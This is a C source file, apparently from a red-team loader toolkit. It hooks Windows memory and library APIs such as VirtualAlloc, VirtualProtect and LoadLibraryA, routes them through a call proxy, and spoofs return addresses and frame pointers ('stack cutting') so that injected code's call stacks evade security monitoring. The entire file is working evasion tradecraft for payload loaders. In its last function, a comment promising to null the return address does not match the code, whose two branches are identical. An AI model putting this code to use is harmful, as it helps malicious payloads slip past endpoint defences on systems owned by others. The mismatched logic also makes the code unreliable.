/*
 * Copyright 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS Ã¢Â€ÂœAS ISÃ¢Â€Â AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
 
#include <windows.h>
#include "tcg.h"
#include "proxy.h"
 
WINBASEAPI VOID WINAPI KERNEL32$Sleep (DWORD dwMilliseconds);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualProtect (LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
WINUSERAPI int  WINAPI USER32$MessageBoxA(HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType);
 
/*
 * GLOBALS
 */
PROXY     CallProxy;
PROXYCALL call;
 
ULONG_PTR proxy(int argc) {
    call.argc              = argc;
    return CallProxy(&call);
}
 
/*
 * HOOKS
 */
HMODULE WINAPI _cLoadLibraryA (LPCSTR lpLibFileName) {
    call.function = (ULONG_PTR)LoadLibraryA;
    call.args[0]  = (ULONG_PTR)lpLibFileName;
 
    return (HMODULE)proxy(1);
}
 
int WINAPI _cMessageBoxA(HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType) {
    call.function = (ULONG_PTR)USER32$MessageBoxA;
    call.args[0]  = (ULONG_PTR)hWnd;
    call.args[1]  = (ULONG_PTR)lpText;
    call.args[2]  = (ULONG_PTR)lpCaption;
    call.args[3]  = (ULONG_PTR)uType;
 
    return (int)proxy(4);
}
 
VOID WINAPI _cSleep (DWORD dwMilliseconds) {
    call.function = (ULONG_PTR)KERNEL32$Sleep;
    call.args[0]  = (ULONG_PTR)dwMilliseconds;
 
    proxy(1);
}
 
LPVOID WINAPI _cVirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    call.function = (ULONG_PTR)KERNEL32$VirtualAlloc;
    call.args[0]  = (ULONG_PTR)lpAddress;
    call.args[1]  = (ULONG_PTR)dwSize;
    call.args[2]  = (ULONG_PTR)flAllocationType;
    call.args[3]  = (ULONG_PTR)flProtect;
 
    return (LPVOID)proxy(4);
}
 
WINBOOL WINAPI _cVirtualProtect (LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
    call.function = (ULONG_PTR)KERNEL32$VirtualProtect;
    call.args[0]  = (ULONG_PTR)lpAddress;
    call.args[1]  = (ULONG_PTR)dwSize;
    call.args[2]  = (ULONG_PTR)flNewProtect;
    call.args[3]  = (ULONG_PTR)lpflOldProtect;
 
    return (WINBOOL)proxy(4);
}
 
/*
 * SETUP PROCESS
 */
void setupHooks(char * srchooks, char * dsthooks, DLLDATA * data, char * dstdll);
 
/* this is a linker intrinsic to get the tag of our confighooks export function. */
int __tag_configstackcutting();
 
/* function prototype for our stackcutting PICO setup thing */
typedef void (*PICO_CONFIG_STACKCUTTING)(PROXY proxy, char * retaddr, char * frameaddr);
 
/*
 * Implement the setupHooks function called by loader.c--which is our chance to call our exported config function.
 * We do this here because this is where our global vars with the stack cutting info live
 */
void setupHooksStackCutting(char * srchooks, char * dsthooks, DLLDATA * data, char * dstdll) {
    /* call the function exported by our PICO */
    ((PICO_CONFIG_STACKCUTTING)PicoGetExport(srchooks, dsthooks, __tag_configstackcutting())) (CallProxy, (char *)call.spoofme.retaddr, (char *)call.spoofme.frameaddr);
 
    /* continue the chain */
    setupHooks(srchooks, dsthooks, data, dstdll);
}
 
/*
 * EXPORT
 */
 
/* receive a configuration from elsewhere.. we export this function */
void configstackcutting(PROXY proxy, char * retaddr, char * frameaddr) {
    /*
     * Keep track of the return address and frame pointer from the context that called our loader. These are
     * the values we are going to "spoof" later on.
     *
     * Note, I've opted to detect when the framepointer is NULL, and use that as a clue that our execution
     * started from a context without a good frame behind us (e.g., CreateRemoteThread). In these situations,
     * if we spam the return address without a valid frame pointer--we're going to get a stack unwinding that's
     * less predictable.
     *
     * By opting to NULL the return address when the frame pointer is null, my goal is to, at least, get a
     * truncated call stack in these situations.
     */
    if (frameaddr == 0) {
        call.spoofme.retaddr   = (ULONG_PTR)retaddr;
        call.spoofme.frameaddr = (ULONG_PTR)frameaddr;
    }
    else {
        call.spoofme.retaddr   = (ULONG_PTR)retaddr;
        call.spoofme.frameaddr = (ULONG_PTR)frameaddr;
    }
 
    /* set our call proxy too */
    CallProxy = proxy;
}